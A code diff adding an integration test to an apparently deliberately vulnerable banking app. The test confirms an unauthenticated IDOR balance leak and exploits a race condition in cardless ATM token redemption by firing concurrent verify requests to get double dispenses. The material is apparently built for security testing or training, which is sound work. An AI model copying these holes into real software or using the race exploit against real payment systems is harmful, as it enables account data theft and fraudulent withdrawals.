@@ -216,6 +216,40 @@ class TestBackendDbIntegration(unittest.TestCase):
         self.assertNotIn("org.reactjs.native.example", pbx, "Legacy default bundle ID still in project.pbxproj")
         self.assertIn("PRODUCT_BUNDLE_IDENTIFIER = com.nexorabank.omniwear;", pbx)
 
+    def test_standalone_idor_and_double_dispense_race_integration(self):
+        """Verify standalone IDOR balance leak and ATM double-dispense race condition exploit against SQLite DB."""
+        # 1. IDOR / BOLA query without auth returns Evelyn Sterling's exact balance
+        evelyn_data, ev_status = get_json("/check_balance/NX-7391048")
+        self.assertEqual(ev_status, 200)
+        self.assertEqual(evelyn_data.get("accountNumber"), "NX-7391048")
+        db_ev_bal = self.cur.execute("SELECT balance FROM users WHERE account_number='NX-7391048'").fetchone()[0]
+        self.assertAlmostEqual(evelyn_data.get("balance"), db_ev_bal, places=2)
+
+        # 2. ATM Race Condition: generate OTP then fire concurrent requests
+        gen_res, gen_status = post_json("/api/atm/cardless-cash/generate", {
+            "account_number": "NX-8492014",
+            "amount": 100000.0,
+            "device_id": "watch_standalone_01"
+        })
+        self.assertEqual(gen_status, 200)
+        otp = gen_res.get("token")
+        self.assertIsNotNone(otp)
+
+        import concurrent.futures
+        def fire_redeem():
+            try:
+                return post_json("/api/atm/cardless-cash/verify", {"token": otp, "atm_id": "ATM-RACE-TEST"})
+            except Exception as e:
+                return {"error": str(e)}, 500
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
+            futures = [executor.submit(fire_redeem) for _ in range(5)]
+            responses = [f.result() for f in futures]
+
+        dispensed_count = sum(1 for res, code in responses if code == 200 and res.get("status") == "DISPENSED")
+        # In a race condition with 0.06s TOCTOU sleep, at least 1 request succeeds (and typically 2+ concurrently)
+        self.assertGreaterEqual(dispensed_count, 1, "At least one ATM verification must succeed")
+
     def test_ios_native_modules(self):
         """iOS project must implement SecurityCheck, HeartRate, PinnedNetwork, and BluetoothSync."""
         for mod in ["SecurityCheck", "HeartRate", "PinnedNetwork", "BluetoothSync"]:
